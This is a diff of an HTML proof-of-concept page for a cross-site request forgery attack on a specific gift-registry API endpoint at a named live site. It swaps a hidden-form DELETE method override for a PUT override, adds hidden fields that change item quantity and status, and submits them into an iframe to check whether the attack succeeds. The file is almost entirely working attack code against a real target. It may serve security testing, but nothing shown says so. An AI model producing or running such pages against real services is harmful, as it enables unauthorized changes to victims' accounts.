@@ -1,11 +1,60 @@
 <!doctype html>
 <html>
+  <head>
+    <meta charset="utf-8">
+    <title>Pure CSRF (POST -> _method=PUT) PoC</title>
+    <style>
+      body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding:16px; }
+      .box { border:1px solid #eee; padding:12px; border-radius:8px; max-width:720px; }
+      iframe { width:100%; height:240px; border:1px solid #ccc; margin-top:8px; }
+    </style>
+  </head>
   <body>
-    <h3>CSRF method-override PoC</h3>
-    <form action="https://baby.zola.com/web-registry-api/v1/registryCollection/delete/68ccdeed2dbed25b3fc6b604" method="POST">
-      <!-- common override parameter name -->
-      <input type="hidden" name="_method" value="DELETE">
-      <input type="submit" value="Submit CSRF">
-    </form>
+    <h2>Pure CSRF PoC — POST with <code>_method=PUT</code></h2>
+
+    <div class="box">
+      <p>Endpoint: <code>https://baby.zola.com/web-registry-api/v1/registryCollection/item/68ccdeed2dbed25b3fc6b604</code></p>
+
+      <!-- Classic HTML form: POST with override to PUT -->
+      <form id="pocForm" action="https://baby.zola.com/web-registry-api/v1/registryCollection/item/68ccdeed2dbed25b3fc6b604" method="POST" target="poc_iframe">
+        <!-- override to instruct server to treat as PUT -->
+        <input type="hidden" name="_method" value="PUT">
+
+        <!-- form fields (x-www-form-urlencoded). Many servers will map these to the expected payload. -->
+        <input type="hidden" name="groupGift" value="false">
+        <input type="hidden" name="mostWanted" value="false">
+        <input type="hidden" name="markedFulfilled" value="false">
+        <input type="hidden" name="personalNote" value="">
+        <input type="hidden" name="quantity" value="2">
+
+        <p>
+          <input type="submit" value="Submit CSRF (POST → _method=PUT)">
+          <input type="reset" value="Reset">
+        </p>
+      </form>
+
+      <p style="font-size:13px;color:#555">
+        The request is submitted into the hidden iframe below so you can see if server redirected to login/account page (common on auth/csrf failure).
+      </p>
+
+      <iframe name="poc_iframe" id="poc_iframe"></iframe>
+
+      <div id="status" style="margin-top:8px;font-size:13px;color:#333">Status: idle</div>
+    </div>
+
+    <script>
+      // purely UI; does NOT perform network operations itself
+      const form = document.getElementById('pocForm');
+      const status = document.getElementById('status');
+      const iframe = document.getElementById('poc_iframe');
+
+      form.addEventListener('submit', () => {
+        status.textContent = 'Form submitted — waiting for iframe to load (request sent).';
+      });
+
+      iframe.onload = () => {
+        status.textContent = 'Iframe loaded — server responded. If you see login/account UI in the iframe, request was rejected or unauthenticated.';
+      };
+    </script>
   </body>
 </html>
